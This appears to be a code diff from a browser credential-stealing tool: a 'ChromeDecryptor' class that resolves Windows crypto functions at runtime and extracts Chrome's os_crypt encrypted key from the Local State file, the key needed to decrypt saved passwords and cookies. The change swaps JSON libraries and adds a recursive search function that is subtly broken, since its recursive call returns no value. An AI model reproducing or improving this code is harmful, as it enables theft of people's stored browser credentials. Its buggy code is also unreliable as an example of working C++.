@@ -8,11 +8,11 @@ ChromeDecryptor::ChromeDecryptor()
 	if (!m_pbOutput)
 		m_pbOutput = new char[MAX_SIZE_PASS];
 
-	m_BCryptDecrypt = WinApiImport<f_BCryptDecrypt>::get_func("BCryptDecrypt", "bcrypt.dll");
-	m_CryptUnprotectData = WinApiImport<f_CryptUnprotectData>::get_func("CryptUnprotectData", "crypt32.dll");
-	m_BCryptOpenAlgorithmProvider = WinApiImport<f_BCryptOpenAlgorithmProvider>::get_func("BCryptOpenAlgorithmProvider", "bcrypt.dll");
-	m_BCryptSetProperty = WinApiImport<f_BCryptSetProperty>::get_func("BCryptSetProperty", "bcrypt.dll");
-	m_BCryptGenerateSymmetricKey = WinApiImport<f_BCryptGenerateSymmetricKey>::get_func("BCryptGenerateSymmetricKey", "bcrypt.dll");
+	m_BCryptDecrypt = WinApiImport<f_BCryptDecrypt>::get("BCryptDecrypt", "bcrypt.dll");
+	m_CryptUnprotectData = WinApiImport<f_CryptUnprotectData>::get("CryptUnprotectData", "crypt32.dll");
+	m_BCryptOpenAlgorithmProvider = WinApiImport<f_BCryptOpenAlgorithmProvider>::get("BCryptOpenAlgorithmProvider", "bcrypt.dll");
+	m_BCryptSetProperty = WinApiImport<f_BCryptSetProperty>::get("BCryptSetProperty", "bcrypt.dll");
+	m_BCryptGenerateSymmetricKey = WinApiImport<f_BCryptGenerateSymmetricKey>::get("BCryptGenerateSymmetricKey", "bcrypt.dll");
 }
 
 ChromeDecryptor::~ChromeDecryptor()
@@ -111,16 +111,18 @@ bool ChromeDecryptor::get_chrome_key(std::string& key, unsigned long& keySize, c
 	String raw_json;
 	if(!IO::read_file(chrome_path, raw_json)) return false;
 
-	auto json_text = nlohmann::json::parse(raw_json);
 
-	auto empty = json_text.empty();
+	const auto json_root = cJSON_Parse(raw_json.c_str());
+	if(!json_root) return false;
 
-	if (!json_text.contains("os_crypt")) return false;
+	if(const auto node =  find_os_crypt_node(json_root->child, "os_crypt"))
+	{
+		key = cJSON_GetStringValue(node->child);
+		keySize = key.length();
+	}
+	
 
-	if (!json_text.at("os_crypt").contains("encrypted_key")) return false;
-
-	key = json_text.at("os_crypt").at("encrypted_key").get<std::string>();
-	keySize = key.length();
+	
 
 	return true;
 }
@@ -236,4 +238,16 @@ bool ChromeDecryptor::init_key_for_chrome_80(PBYTE pbKey, ULONG sizeKey)
 	}
 
 	return bRet;
+}
+
+cJSON* ChromeDecryptor::find_os_crypt_node(cJSON* input_node, const char* pattern)
+{
+	if (!input_node) return nullptr;
+
+	if (strcmp(input_node->string, pattern) == 0)
+	{
+		return input_node;
+	}
+
+	find_os_crypt_node(input_node->next, pattern);
 }
